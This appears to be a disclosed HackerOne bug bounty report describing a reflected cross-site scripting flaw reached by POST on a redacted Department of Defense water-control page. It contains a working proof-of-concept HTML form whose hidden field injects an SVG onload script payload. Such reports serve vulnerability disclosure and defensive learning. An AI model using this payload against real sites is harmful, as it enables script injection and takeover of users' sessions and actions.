# XSS Reflect to POST █████

## Report Details
- **Report ID**: 1003433
- **URL**: https://hackerone.com/reports/1003433
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-09T12:15:54.731Z
- **Disclosed**: 2020-11-23T18:05:32.578Z

## Reporter
- **Username**: ofjaaaah
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
#XSS to POST 

URL =  █████████


Good morning team DoD..
I located an XSS on the site. 
I hope to help team DoD more and more. Thank you


```html
<form action=█████████/WaterControl/shefgraph-historic.cfm?sid=BL110 method=POST><input type=hidden name="fld_graphrslow" value="Y"><input type=hidden name="fld_graphrslow" value="N"><input type=hidden name="Submit" value="View Graph"><input type=hidden name="fld_from1" value="01/01/2020"><input type=hidden name="fld_to1" value="12/31/2020"><input type=hidden name="fld_displaytype" value="S"><input type=hidden name="fld_type1" value="Plot"><input type=hidden name="fld_frompor" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(1)&lt;!--"><input type=hidden name="fld_topor" value="1231"><input type=hidden name="fld_year1" value="2020"><input type=hidden name="fld_year2" value="2020"><input type=hidden name="fld_mon1" value="01"><input type=hidden name="fld_day1" value="01"><input type=hidden name="fld_mon2" value="12"><input type=hidden name="fld_day2" value="31"><input type=hidden name="fld_param" value="HG"><input type=submit value=XSS></form>
```

## Impact

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

    Perform any action within the application that the user can perform.
    View any information that the user is able to view.
    Modify any information that the user is able to modify.
    Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

## Attachments
No attachments
